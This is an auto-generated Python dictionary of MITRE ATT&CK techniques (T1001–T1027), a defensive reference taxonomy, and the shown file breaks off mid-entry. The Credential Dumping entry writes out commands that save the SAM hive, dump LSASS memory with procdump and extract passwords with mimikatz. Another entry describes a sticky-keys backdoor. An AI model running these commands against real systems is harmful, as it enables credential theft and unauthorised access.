# This file is generated using generate_attack_map.py script
# DO NOT EDIT! Re-run the script instead...

attack_map = {
 'T1001': {'attack_id': 'T1001',
           'categories': ['command-and-control'],
           'description': 'Command and control (C2) communications are hidden (but not necessarily encrypted) in an '
                          'attempt to make the content more difficult to discover or decipher and to make the '
                          'communication less conspicuous and hide commands from being seen. This encompasses many '
                          'methods, such as adding junk data to protocol traffic, using steganography, commingling '
                          'legitimate traffic with C2 communications traffic, or using a non-standard data encoding '
                          'system, such as a modified Base64 encoding for the message body of an HTTP request.',
           'name': 'Data Obfuscation',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1002': {'attack_id': 'T1002',
           'categories': ['exfiltration'],
           'description': 'An adversary may compress data (e.g., sensitive documents) that is collected prior to '
                          'exfiltration in order to make it portable and minimize the amount of data sent over the '
                          'network. The compression is done separately from the exfiltration channel and is performed '
                          'using a custom program or algorithm, or a more common compression library or utility such '
                          'as 7zip, RAR, ZIP, or zlib.',
           'name': 'Data Compressed',
           'platforms': ['Linux', 'Windows', 'macOS']},
 'T1003': {'attack_id': 'T1003',
           'categories': ['credential-access'],
           'description': 'Credential dumping is the process of obtaining account login and password information, '
                          'normally in the form of a hash or a clear text password, from the operating system and '
                          'software. Credentials can then be used to perform\xa0Lateral Movement\xa0and access '
                          'restricted information.\n'
                          '\n'
                          'Several of the tools mentioned in this technique may be used by both adversaries and '
                          'professional security testers. Additional custom tools likely exist as well.\n'
                          '\n'
                          '### Windows\n'
                          '\n'
                          '#### SAM (Security Accounts Manager)\n'
                          '\n'
                          'The SAM is a database file that contains local accounts for the host, typically those found '
                          'with the ‘net user’ command. To enumerate the SAM database, system level access is '
                          'required.\n'
                          '\xa0\n'
                          'A number of tools can be used to retrieve the SAM file through in-memory techniques:\n'
                          '\n'
                          '* pwdumpx.exe \n'
                          '* [gsecdump](https://attack.mitre.org/software/S0008)\n'
                          '* [Mimikatz](https://attack.mitre.org/software/S0002)\n'
                          '* secretsdump.py\n'
                          '\n'
                          'Alternatively, the SAM can be extracted from the Registry with '
                          '[Reg](https://attack.mitre.org/software/S0075):\n'
                          '\n'
                          '* <code>reg save HKLM\\sam sam</code>\n'
                          '* <code>reg save HKLM\\system system</code>\n'
                          '\n'
                          'Creddump7 can then be used to process the SAM database locally to retrieve hashes. '
                          '(Citation: GitHub Creddump7)\n'
                          '\n'
                          'Notes:\n'
                          'Rid 500 account is the local, in-built administrator.\n'
                          'Rid 501 is the guest account.\n'
                          'User accounts start with a RID of 1,000+.\n'
                          '\n'
                          '#### Cached Credentials\n'
                          '\n'
                          'The DCC2 (Domain Cached Credentials version 2) hash, used by Windows Vista and newer caches '
                          'credentials when the domain controller is unavailable. The number of default cached '
                          'credentials varies, and this number can be altered per system. This hash does not allow '
                          'pass-the-hash style attacks.\n'
                          '\xa0\n'
                          'A number of tools can be used to retrieve the SAM file through in-memory techniques.\n'
                          '\n'
                          '* pwdumpx.exe \n'
                          '* [gsecdump](https://attack.mitre.org/software/S0008)\n'
                          '* [Mimikatz](https://attack.mitre.org/software/S0002)\n'
                          '\n'
                          'Alternatively, reg.exe can be used to extract from the Registry and Creddump7 used to '
                          'gather the credentials.\n'
                          '\n'
                          'Notes:\n'
                          'Cached credentials for Windows Vista are derived using PBKDF2.\n'
                          '\n'
                          '#### Local Security Authority (LSA) Secrets\n'
                          '\n'
                          'With SYSTEM access to a host, the LSA secrets often allows trivial access from a local '
                          'account to domain-based account credentials. The Registry is used to store the LSA '
                          'secrets.\n'
                          '\xa0\n'
                          'When services are run under the context of local or domain users, their passwords are '
                          'stored in the Registry. If auto-logon is enabled, this information will be stored in the '
                          'Registry as well.\n'
                          '\xa0\n'
                          'A number of tools can be used to retrieve the SAM file through in-memory techniques.\n'
                          '\n'
                          '* pwdumpx.exe \n'
                          '* [gsecdump](https://attack.mitre.org/software/S0008)\n'
                          '* [Mimikatz](https://attack.mitre.org/software/S0002)\n'
                          '* secretsdump.py\n'
                          '\n'
                          'Alternatively, reg.exe can be used to extract from the Registry and Creddump7 used to '
                          'gather the credentials.\n'
                          '\n'
                          'Notes:\n'
                          'The passwords extracted by his mechanism are\xa0UTF-16\xa0encoded, which means that they '
                          'are returned in\xa0plaintext.\n'
                          'Windows 10 adds protections for LSA Secrets described in Mitigation.\n'
                          '\n'
                          '#### NTDS from Domain Controller\n'
                          '\n'
                          'Active Directory stores information about members of the domain including devices and users '
                          'to verify credentials and define access rights. The Active Directory domain database is '
                          'stored in the NTDS.dit file. By default the NTDS file will be located in '
                          '%SystemRoot%\\NTDS\\Ntds.dit of a domain controller. (Citation: Wikipedia Active '
                          'Directory)\n'
                          ' \n'
                          'The following tools and techniques can be used to enumerate the NTDS file and the contents '
                          'of the entire Active Directory hashes.\n'
                          '\n'
                          '* Volume Shadow Copy\n'
                          '* secretsdump.py\n'
                          '* Using the in-built Windows tool, ntdsutil.exe\n'
                          '* Invoke-NinjaCopy\n'
                          '\n'
                          '#### Group Policy Preference (GPP) Files\n'
                          '\n'
                          'Group Policy Preferences (GPP) are tools that allowed administrators to create domain '
                          'policies with embedded credentials. These policies, amongst other things, allow '
                          'administrators to set local accounts.\n'
                          '\n'
                          'These group policies are stored in SYSVOL on a domain controller, this means that any '
                          'domain user can view the SYSVOL share and decrypt the password (the AES private key was '
                          'leaked on-line. (Citation: Microsoft GPP Key) (Citation: SRD GPP)\n'
                          '\n'
                          'The following tools and scripts can be used to gather and decrypt the password file from '
                          'Group Policy Preference XML files:\n'
                          '\n'
                          '* Metasploit’s post exploitation module: "post/windows/gather/credentials/gpp"\n'
                          '* Get-GPPPassword (Citation: Obscuresecurity Get-GPPPassword)\n'
                          '* gpprefdecrypt.py\n'
                          '\n'
                          'Notes:\n'
                          'On the SYSVOL share, the following can be used to enumerate potential XML files.\n'
                          'dir /s * .xml\n'
                          '\n'
                          '#### Service Principal Names (SPNs)\n'
                          '\n'
                          'See [Kerberoasting](https://attack.mitre.org/techniques/T1208).\n'
                          '\n'
                          '#### Plaintext Credentials\n'
                          '\n'
                          'After a user logs on to a system, a variety of credentials are generated and stored in '
                          'the\xa0Local Security Authority Subsystem Service\xa0(LSASS) process in memory. These '
                          'credentials can be harvested by a administrative user or SYSTEM.\n'
                          '\n'
                          'SSPI (Security Support Provider Interface) functions as a common interface to several '
                          'Security Support Providers (SSPs):\xa0A Security Support Provider is a\xa0dynamic-link '
                          'library\xa0(DLL) that makes one or more security packages available to applications.\n'
                          '\n'
                          'The following SSPs can be used to access credentials:\n'
                          '\n'
                          'Msv: Interactive logons, batch logons, and service logons are done through the MSV '
                          'authentication package.\n'
                          'Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer '
                          'Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges. (Citation: '
                          'TechNet Blogs Credential Protection)\n'
                          'Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and '
                          'later.\n'
                          'CredSSP: \xa0Provides SSO and\xa0Network Level Authentication\xa0for\xa0Remote Desktop '
                          'Services. (Citation: Microsoft CredSSP)\n'
                          '\xa0\n'
                          'The following tools can be used to enumerate credentials:\n'
                          '\n'
                          '* [Windows Credential Editor](https://attack.mitre.org/software/S0005)\n'
                          '* [Mimikatz](https://attack.mitre.org/software/S0002)\n'
                          '\n'
                          'As well as in-memory techniques, the LSASS process memory can be dumped from the target '
                          'host and analyzed on a local system.\n'
                          '\n'
                          'For example, on the target host use procdump:\n'
                          '\n'
                          '* <code>procdump -ma lsass.exe lsass_dump</code>\n'
                          '\n'
                          'Locally, mimikatz can be run:\n'
                          '\n'
                          '* <code>sekurlsa::Minidump\xa0lsassdump.dmp</code>\n'
                          '* <code>sekurlsa::logonPasswords</code>\n'
                          '\n'
                          '#### DCSync\n'
                          '\n'
                          'DCSync is a variation on credential dumping which can be used to acquire sensitive '
                          'information from a domain controller. Rather than executing recognizable malicious code, '
                          "the action works by abusing the domain controller's  application programming interface "
                          '(API) (Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges) (Citation: '
                          'Samba DRSUAPI) (Citation: Wine API samlib.dll) to simulate the replication process from a '
                          'remote domain controller. Any members of the Administrators, Domain Admins, Enterprise '
                          'Admin groups or computer accounts on the domain controller are able to run DCSync to pull '
                          'password data (Citation: ADSecurity Mimikatz DCSync) from Active Directory, which may '
                          'include current and historical hashes of potentially useful accounts such as KRBTGT and '
                          'Administrators. The hashes can then in turn be used to create a Golden Ticket for use in '
                          '[Pass the Ticket](https://attack.mitre.org/techniques/T1097) (Citation: Harmj0y Mimikatz '
                          "and DCSync) or change an account's password as noted in [Account "
                          'Manipulation](https://attack.mitre.org/techniques/T1098). (Citation: InsiderThreat '
                          'ChangeNTLM July 2017) DCSync functionality has been included in the "lsadump" module in '
                          'Mimikatz. (Citation: GitHub Mimikatz lsadump Module) Lsadump also includes NetSync, which '
                          'performs DCSync over a legacy replication protocol. (Citation: Microsoft NRPC Dec 2017)\n'
                          '\n'
                          '### Linux\n'
                          '\n'
                          '#### Proc filesystem\n'
                          '\n'
                          'The /proc filesystem on Linux contains a great deal of information regarding the state of '
                          'the running operating system. Processes running with root privileges can use this facility '
                          'to scrape live memory of other running programs. If any of these programs store passwords '
                          'in clear text or password hashes in memory, these values can then be harvested for either '
                          'usage or brute force attacks, respectively. This functionality has been implemented in the '
                          '[MimiPenguin](https://attack.mitre.org/software/S0179), an open source tool inspired by '
                          '[Mimikatz](https://attack.mitre.org/software/S0002). The tool dumps process memory, then '
                          'harvests passwords and hashes by looking for text strings and regex patterns for how given '
                          'applications such as Gnome Keyring, sshd, and Apache use memory to store such '
                          'authentication artifacts.',
           'name': 'Credential Dumping',
           'platforms': ['Windows', 'Linux', 'macOS']},
 'T1004': {'attack_id': 'T1004',
           'categories': ['persistence'],
           'description': 'Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the '
                          'secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in '
                          '<code>HKLM\\Software\\[Wow6432Node\\]Microsoft\\Windows '
                          'NT\\CurrentVersion\\Winlogon\\</code> and <code>HKCU\\Software\\Microsoft\\Windows '
                          'NT\\CurrentVersion\\Winlogon\\</code> are used to manage additional helper programs and '
                          'functionalities that support Winlogon. (Citation: Cylance Reg Persistence Sept 2013) \n'
                          '\n'
                          'Malicious modifications to these Registry keys may cause Winlogon to load and execute '
                          'malicious DLLs and/or executables. Specifically, the following subkeys have been known to '
                          'be possibly vulnerable to abuse: (Citation: Cylance Reg Persistence Sept 2013)\n'
                          '\n'
                          '* Winlogon\\Notify - points to notification package DLLs that handle Winlogon events\n'
                          '* Winlogon\\Userinit - points to userinit.exe, the user initialization program executed '
                          'when a user logs on\n'
                          '* Winlogon\\Shell - points to explorer.exe, the system shell executed when a user logs on\n'
                          '\n'
                          'Adversaries may take advantage of these features to repeatedly execute malicious code and '
                          'establish Persistence.',
           'name': 'Winlogon Helper DLL',
           'platforms': ['Windows']},
 'T1005': {'attack_id': 'T1005',
           'categories': ['collection'],
           'description': 'Sensitive data can be collected from local system sources, such as the file system or '
                          'databases of information residing on the system prior to Exfiltration.\n'
                          '\n'
                          'Adversaries will often search the file system on computers they have compromised to find '
                          'files of interest. They may do this using a [Command-Line '
                          'Interface](https://attack.mitre.org/techniques/T1059), such as '
                          '[cmd](https://attack.mitre.org/software/S0106), which has functionality to interact with '
                          'the file system to gather information. Some adversaries may also use [Automated '
                          'Collection](https://attack.mitre.org/techniques/T1119) on the local system.\n',
           'name': 'Data from Local System',
           'platforms': ['Linux', 'macOS', 'Windows', 'GCP', 'AWS', 'Azure']},
 'T1006': {'attack_id': 'T1006',
           'categories': ['defense-evasion'],
           'description': 'Windows allows programs to have direct access to logical volumes. Programs with direct '
                          'access may read and write files directly from the drive by analyzing file system data '
                          'structures. This technique bypasses Windows file access controls as well as file system '
                          'monitoring tools. (Citation: Hakobyan 2009)\n'
                          '\n'
                          'Utilities, such as NinjaCopy, exist to perform these actions in PowerShell. (Citation: '
                          'Github PowerSploit Ninjacopy)',
           'name': 'File System Logical Offsets',
           'platforms': ['Windows']},
 'T1007': {'attack_id': 'T1007',
           'categories': ['discovery'],
           'description': 'Adversaries may try to get information about registered services. Commands that may obtain '
                          'information about services using operating system utilities are "sc," "tasklist /svc" using '
                          '[Tasklist](https://attack.mitre.org/software/S0057), and "net start" using '
                          '[Net](https://attack.mitre.org/software/S0039), but adversaries may also use other tools as '
                          'well. Adversaries may use the information from [System Service '
                          'Discovery](https://attack.mitre.org/techniques/T1007) during automated discovery to shape '
                          'follow-on behaviors, including whether or not the adversary fully infects the target and/or '
                          'attempts specific actions.',
           'name': 'System Service Discovery',
           'platforms': ['Windows']},
 'T1008': {'attack_id': 'T1008',
           'categories': ['command-and-control'],
           'description': 'Adversaries may use fallback or alternate communication channels if the primary channel is '
                          'compromised or inaccessible in order to maintain reliable command and control and to avoid '
                          'data transfer thresholds.',
           'name': 'Fallback Channels',
           'platforms': ['Linux', 'Windows', 'macOS']},
 'T1009': {'attack_id': 'T1009',
           'categories': ['defense-evasion'],
           'description': 'Adversaries can use binary padding to add junk data and change the on-disk representation '
                          'of malware without affecting the functionality or behavior of the binary. This will often '
                          'increase the size of the binary beyond what some security tools are capable of handling due '
                          'to file size limitations.\n'
                          '\n'
                          'Binary padding effectively changes the checksum of the file and can also be used to avoid '
                          'hash-based blacklists and static anti-virus signatures.(Citation: ESET OceanLotus) The '
                          'padding used is commonly generated by a function to create junk data and then appended to '
                          'the end or applied to sections of malware.(Citation: Securelist Malware Tricks April 2017) '
                          'Increasing the file size may decrease the effectiveness of certain tools and detection '
                          'capabilities that are not designed or configured to scan large files. This may also reduce '
                          'the likelihood of being collected for analysis. Public file scanning services, such as '
                          'VirusTotal, limits the maximum size of an uploaded file to be analyzed.(Citation: '
                          'VirusTotal FAQ)\n',
           'name': 'Binary Padding',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1010': {'attack_id': 'T1010',
           'categories': ['discovery'],
           'description': 'Adversaries may attempt to get a listing of open application windows. Window listings could '
                          'convey information about how the system is used or give context to information collected by '
                          'a keylogger.\n'
                          '\n'
                          'In Mac, this can be done natively with a small '
                          '[AppleScript](https://attack.mitre.org/techniques/T1155) script.',
           'name': 'Application Window Discovery',
           'platforms': ['macOS', 'Windows']},
 'T1011': {'attack_id': 'T1011',
           'categories': ['exfiltration'],
           'description': 'Exfiltration could occur over a different network medium than the command and control '
                          'channel. If the command and control network is a wired Internet connection, the '
                          'exfiltration may occur, for example, over a WiFi connection, modem, cellular data '
                          'connection, Bluetooth, or another radio frequency (RF) channel. Adversaries could choose to '
                          'do this if they have sufficient access or proximity, and the connection might not be '
                          'secured or defended as well as the primary Internet-connected channel because it is not '
                          'routed through the same enterprise network.',
           'name': 'Exfiltration Over Other Network Medium',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1012': {'attack_id': 'T1012',
           'categories': ['discovery'],
           'description': 'Adversaries may interact with the Windows Registry to gather information about the system, '
                          'configuration, and installed software.\n'
                          '\n'
                          'The Registry contains a significant amount of information about the operating system, '
                          'configuration, software, and security. (Citation: Wikipedia Windows Registry) Some of the '
                          'information may help adversaries to further their operation within a network. Adversaries '
                          'may use the information from [Query Registry](https://attack.mitre.org/techniques/T1012) '
                          'during automated discovery to shape follow-on behaviors, including whether or not the '
                          'adversary fully infects the target and/or attempts specific actions.',
           'name': 'Query Registry',
           'platforms': ['Windows']},
 'T1013': {'attack_id': 'T1013',
           'categories': ['persistence', 'privilege-escalation'],
           'description': 'A port monitor can be set through the  (Citation: AddMonitor) API call to set a DLL to be '
                          'loaded at startup. (Citation: AddMonitor) This DLL can be located in '
                          '<code>C:\\Windows\\System32</code> and will be loaded by the print spooler service, '
                          'spoolsv.exe, on boot. The spoolsv.exe process also runs under SYSTEM level permissions. '
                          '(Citation: Bloxham) Alternatively, an arbitrary DLL can be loaded if permissions allow '
                          'writing a fully-qualified pathname for that DLL to '
                          '<code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors</code>. \n'
                          '\n'
                          'The Registry key contains entries for the following:\n'
                          '\n'
                          '* Local Port\n'
                          '* Standard TCP/IP Port\n'
                          '* USB Monitor\n'
                          '* WSD Port\n'
                          '\n'
                          'Adversaries can use this technique to load malicious code at startup that will persist on '
                          'system reboot and execute as SYSTEM.',
           'name': 'Port Monitors',
           'platforms': ['Windows']},
 'T1014': {'attack_id': 'T1014',
           'categories': ['defense-evasion'],
           'description': 'Rootkits are programs that hide the existence of malware by intercepting (i.e., '
                          '[Hooking](https://attack.mitre.org/techniques/T1179)) and modifying operating system API '
                          'calls that supply system information. (Citation: Symantec Windows Rootkits) Rootkits or '
                          'rootkit enabling functionality may reside at the user or kernel level in the operating '
                          'system or lower, to include a [Hypervisor](https://attack.mitre.org/techniques/T1062), '
                          'Master Boot Record, or the [System Firmware](https://attack.mitre.org/techniques/T1019). '
                          '(Citation: Wikipedia Rootkit)\n'
                          '\n'
                          'Adversaries may use rootkits to hide the presence of programs, files, network connections, '
                          'services, drivers, and other system components. Rootkits have been seen for Windows, Linux, '
                          'and Mac OS X systems. (Citation: CrowdStrike Linux Rootkit) (Citation: BlackHat Mac OSX '
                          'Rootkit)',
           'name': 'Rootkit',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1015': {'attack_id': 'T1015',
           'categories': ['persistence', 'privilege-escalation'],
           'description': 'Windows contains accessibility features that may be launched with a key combination before '
                          'a user has logged in (for example, when the user is on the Windows logon screen). An '
                          'adversary can modify the way these programs are launched to get a command prompt or '
                          'backdoor without logging in to the system.\n'
                          '\n'
                          'Two common accessibility programs are <code>C:\\Windows\\System32\\sethc.exe</code>, '
                          'launched when the shift key is pressed five times and '
                          '<code>C:\\Windows\\System32\\utilman.exe</code>, launched when the Windows + U key '
                          'combination is pressed. The sethc.exe program is often referred to as "sticky keys", and '
                          'has been used by adversaries for unauthenticated access through a remote desktop login '
                          'screen. (Citation: FireEye Hikit Rootkit)\n'
                          '\n'
                          'Depending on the version of Windows, an adversary may take advantage of these features in '
                          'different ways because of code integrity enhancements. In newer versions of Windows, the '
                          'replaced binary needs to be digitally signed for x64 systems, the binary must reside in '
                          '<code>%systemdir%\\</code>, and it must be protected by Windows File or Resource Protection '
                          '(WFP/WRP). (Citation: DEFCON2016 Sticky Keys) The debugger method was likely discovered as '
                          'a potential workaround because it does not require the corresponding accessibility feature '
                          'binary to be replaced. Examples for both methods:\n'
                          '\n'
                          'For simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 '
                          'and later, for example, the program (e.g., <code>C:\\Windows\\System32\\utilman.exe</code>) '
                          'may be replaced with "cmd.exe" (or another program that provides backdoor access). '
                          'Subsequently, pressing the appropriate key combination at the login screen while sitting at '
                          'the keyboard or when connected over [Remote Desktop '
                          'Protocol](https://attack.mitre.org/techniques/T1076) will cause the replaced file to be '
                          'executed with SYSTEM privileges. (Citation: Tilbury 2014)\n'
                          '\n'
                          'For the debugger method on Windows Vista and later as well as Windows Server 2008 and '
                          'later, for example, a Registry key may be modified that configures "cmd.exe," or another '
                          'program that provides backdoor access, as a "debugger" for the accessibility program (e.g., '
                          '"utilman.exe"). After the Registry is modified, pressing the appropriate key combination at '
                          'the login screen while at the keyboard or when connected with RDP will cause the "debugger" '
                          'program to be executed with SYSTEM privileges. (Citation: Tilbury 2014)\n'
                          '\n'
                          'Other accessibility features exist that may also be leveraged in a similar fashion: '
                          '(Citation: DEFCON2016 Sticky Keys)\n'
                          '\n'
                          '* On-Screen Keyboard: <code>C:\\Windows\\System32\\osk.exe</code>\n'
                          '* Magnifier: <code>C:\\Windows\\System32\\Magnify.exe</code>\n'
                          '* Narrator: <code>C:\\Windows\\System32\\Narrator.exe</code>\n'
                          '* Display Switcher: <code>C:\\Windows\\System32\\DisplaySwitch.exe</code>\n'
                          '* App Switcher: <code>C:\\Windows\\System32\\AtBroker.exe</code>',
           'name': 'Accessibility Features',
           'platforms': ['Windows']},
 'T1016': {'attack_id': 'T1016',
           'categories': ['discovery'],
           'description': 'Adversaries will likely look for details about the network configuration and settings of '
                          'systems they access or through information discovery of remote systems. Several operating '
                          'system administration utilities exist that can be used to gather this information. Examples '
                          'include [Arp](https://attack.mitre.org/software/S0099), '
                          '[ipconfig](https://attack.mitre.org/software/S0100)/[ifconfig](https://attack.mitre.org/software/S0101), '
                          '[nbtstat](https://attack.mitre.org/software/S0102), and '
                          '[route](https://attack.mitre.org/software/S0103).\n'
                          '\n'
                          'Adversaries may use the information from [System Network Configuration '
                          'Discovery](https://attack.mitre.org/techniques/T1016) during automated discovery to shape '
                          'follow-on behaviors, including whether or not the adversary fully infects the target and/or '
                          'attempts specific actions.',
           'name': 'System Network Configuration Discovery',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1017': {'attack_id': 'T1017',
           'categories': ['lateral-movement'],
           'description': 'Adversaries may deploy malicious software to systems within a network using application '
                          'deployment systems employed by enterprise administrators. The permissions required for this '
                          'action vary by system configuration; local credentials may be sufficient with direct access '
                          'to the deployment server, or specific domain credentials may be required. However, the '
                          'system may require an administrative account to log in or to perform software deployment.\n'
                          '\n'
                          'Access to a network-wide or enterprise-wide software deployment system enables an adversary '
                          'to have remote code execution on all systems that are connected to such a system. The '
                          'access may be used to laterally move to systems, gather information, or cause a specific '
                          'effect, such as wiping the hard drives on all endpoints.',
           'name': 'Application Deployment Software',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1018': {'attack_id': 'T1018',
           'categories': ['discovery'],
           'description': 'Adversaries will likely attempt to get a listing of other systems by IP address, hostname, '
                          'or other logical identifier on a network that may be used for Lateral Movement from the '
                          'current system. Functionality could exist within remote access tools to enable this, but '
                          'utilities available on the operating system could also be used. Adversaries may also use '
                          'local host files in order to discover the hostname to IP address mappings of remote '
                          'systems. \n'
                          '\n'
                          '### Windows\n'
                          '\n'
                          'Examples of tools and commands that acquire this information include "ping" or "net view" '
                          'using [Net](https://attack.mitre.org/software/S0039). The contents of the '
                          '<code>C:\\Windows\\System32\\Drivers\\etc\\hosts</code> file can be viewed to gain insight '
                          'into the existing hostname to IP mappings on the system.\n'
                          '\n'
                          '### Mac\n'
                          '\n'
                          'Specific to Mac, the <code>bonjour</code> protocol to discover additional Mac-based systems '
                          'within the same broadcast domain. Utilities such as "ping" and others can be used to gather '
                          'information about remote systems. The contents of the <code>/etc/hosts</code> file can be '
                          'viewed to gain insight into existing hostname to IP mappings on the system.\n'
                          '\n'
                          '### Linux\n'
                          '\n'
                          'Utilities such as "ping" and others can be used to gather information about remote systems. '
                          'The contents of the <code>/etc/hosts</code> file can be viewed to gain insight into '
                          'existing hostname to IP mappings on the system.\n'
                          '\n'
                          '### Cloud\n'
                          '\n'
                          'In cloud environments, the above techniques may be used to discover remote systems '
                          'depending upon the host operating system. In addition, cloud environments often provide '
                          'APIs with information about remote systems and services.\n',
           'name': 'Remote System Discovery',
           'platforms': ['Linux', 'macOS', 'Windows', 'GCP', 'Azure', 'AWS']},
 'T1019': {'attack_id': 'T1019',
           'categories': ['persistence'],
           'description': 'The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) '
                          'or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the '
                          'software interface between the operating system and hardware of a computer. (Citation: '
                          'Wikipedia BIOS) (Citation: Wikipedia UEFI) (Citation: About UEFI)\n'
                          '\n'
                          'System firmware like BIOS and (U)EFI underly the functionality of a computer and may be '
                          'modified by an adversary to perform or assist in malicious activity. Capabilities exist to '
                          'overwrite the system firmware, which may give sophisticated adversaries a means to install '
                          'malicious firmware updates as a means of persistence on a system that may be difficult to '
                          'detect.',
           'name': 'System Firmware',
           'platforms': ['Windows']},
 'T1020': {'attack_id': 'T1020',
           'categories': ['exfiltration'],
           'description': 'Data, such as sensitive documents, may be exfiltrated through the use of automated '
                          'processing or [Scripting](https://attack.mitre.org/techniques/T1064) after being gathered '
                          'during Collection. \n'
                          '\n'
                          'When automated exfiltration is used, other exfiltration techniques likely apply as well to '
                          'transfer the information out of the network, such as [Exfiltration Over Command and Control '
                          'Channel](https://attack.mitre.org/techniques/T1041) and [Exfiltration Over Alternative '
                          'Protocol](https://attack.mitre.org/techniques/T1048).',
           'name': 'Automated Exfiltration',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1021': {'attack_id': 'T1021',
           'categories': ['lateral-movement'],
           'description': 'An adversary may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log '
                          'into a service specifically designed to accept remote connections, such as telnet, SSH, and '
                          'VNC. The adversary may then perform actions as the logged-on user.',
           'name': 'Remote Services',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1022': {'attack_id': 'T1022',
           'categories': ['exfiltration'],
           'description': 'Data is encrypted before being exfiltrated in order to hide the information that is being '
                          'exfiltrated from detection or to make the exfiltration less conspicuous upon inspection by '
                          'a defender. The encryption is performed by a utility, programming library, or custom '
                          'algorithm on the data itself and is considered separate from any encryption performed by '
                          'the command and control or file transfer protocol. Common file archive formats that can '
                          'encrypt files are RAR and zip.\n'
                          '\n'
                          'Other exfiltration techniques likely apply as well to transfer the information out of the '
                          'network, such as [Exfiltration Over Command and Control '
                          'Channel](https://attack.mitre.org/techniques/T1041) and [Exfiltration Over Alternative '
                          'Protocol](https://attack.mitre.org/techniques/T1048)',
           'name': 'Data Encrypted',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1023': {'attack_id': 'T1023',
           'categories': ['persistence'],
           'description': 'Shortcuts or symbolic links are ways of referencing other files or programs that will be '
                          'opened or executed when the shortcut is clicked or executed by a system startup process. '
                          'Adversaries could use shortcuts to execute their tools for persistence. They may create a '
                          'new shortcut as a means of indirection that may use '
                          '[Masquerading](https://attack.mitre.org/techniques/T1036) to look like a legitimate '
                          'program. Adversaries could also edit the target path or entirely replace an existing '
                          'shortcut so their tools will be executed instead of the intended legitimate program.',
           'name': 'Shortcut Modification',
           'platforms': ['Windows']},
 'T1024': {'attack_id': 'T1024',
           'categories': ['command-and-control'],
           'description': 'Adversaries may use a custom cryptographic protocol or algorithm to hide command and '
                          'control traffic. A simple scheme, such as XOR-ing the plaintext with a fixed key, will '
                          'produce a very weak ciphertext.\n'
                          '\n'
                          'Custom encryption schemes may vary in sophistication. Analysis and reverse engineering of '
                          'malware samples may be enough to discover the algorithm and encryption key used.\n'
                          '\n'
                          'Some adversaries may also attempt to implement their own version of a well-known '
                          'cryptographic algorithm instead of using a known implementation library, which may lead to '
                          'unintentional errors. (Citation: F-Secure Cosmicduke)',
           'name': 'Custom Cryptographic Protocol',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1025': {'attack_id': 'T1025',
           'categories': ['collection'],
           'description': 'Sensitive data can be collected from any removable media (optical disk drive, USB memory, '
                          'etc.) connected to the compromised system prior to Exfiltration.\n'
                          '\n'
                          'Adversaries may search connected removable media on computers they have compromised to find '
                          'files of interest. Interactive command shells may be in use, and common functionality '
                          'within [cmd](https://attack.mitre.org/software/S0106) may be used to gather information. '
                          'Some adversaries may also use [Automated '
                          'Collection](https://attack.mitre.org/techniques/T1119) on removable media.',
           'name': 'Data from Removable Media',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1026': {'attack_id': 'T1026',
           'categories': ['command-and-control'],
           'description': 'Some adversaries may split communications between different protocols. There could be one '
                          'protocol for inbound command and control and another for outbound data, allowing it to '
                          'bypass certain firewall restrictions. The split could also be random to simply avoid data '
                          'threshold alerts on any one communication.',
           'name': 'Multiband Communication',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1027': {'attack_id': 'T1027',
           'categories': ['defense-evasion'],
           'description': 'Adversaries may attempt to make an executable or file difficult to discover or analyze by '
                          'encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. '
                          'This is common behavior that can be used across different platforms and the network to '
                          'evade defenses.\n'
                          '\n'
                          'Payloads may be compressed, archived, or encrypted in order to avoid detection. These '
                          'payloads may be used during Initial Access or later to mitigate detection. Sometimes a '
                          "user's action may be required to open and [Deobfuscate/Decode Files or "
                          'Information](https://attack.mitre.org/techniques/T1140) for [User '
                          'Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to '
                          'input a password to open a password protected compressed/encrypted file that was provided '
                          'by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also used '
                          'compressed or archived scripts, such as Javascript.\n'
                          '\n'
                          'Portions of files can also be encoded to hide the plain-text strings that would otherwise '
                          'help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) '
                          'Payloads may also be split into separate, seemingly benign files that only reveal malicious '
                          'functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016)\n'
                          '\n'
                          'Adversaries may also obfuscate commands executed from payloads or directly via a '
                          '[Command-Line Interface](https://attack.mitre.org/techniques/T1059). Environment variables, '
                          'aliases, characters, and other platform/language specific semantics can be used to evade '
                          'signature based detections and whitelisting mechanisms. (Citation: FireEye Obfuscation June '
                          '2017) (Citation: FireEye Revoke-Obfuscation July 2017) (Citation: PaloAlto EncodedCommand '
                          'March 2017)\n'
                          '\n'
                          'Another example of obfuscation is through the use of steganography, a technique of hiding '
                          'messages or code in images, audio tracks, video clips, or text files. One of the first '
                          'known and reported adversaries that used steganography activity surrounding '
                          '[Invoke-PSImage](https://attack.mitre.org/software/S0231). The Duqu malware encrypted the '
                          "gathered information from a victim's system and hid it into an image followed by "
                          'exfiltrating the image to a C2 server. (Citation: Wikipedia Duqu) By the end of 2017, an '
                          'adversary group used [Invoke-PSImage](https://attack.mitre.org/software/S0231) to hide '
                          "PowerShell commands in an image file (png) and execute the code on a victim's system. In "
                          'this particular case the PowerShell code downloaded another obfuscated script to gather '
                          "intelligence from the victim's machine and communicate it back to the adversary. (Citation: "
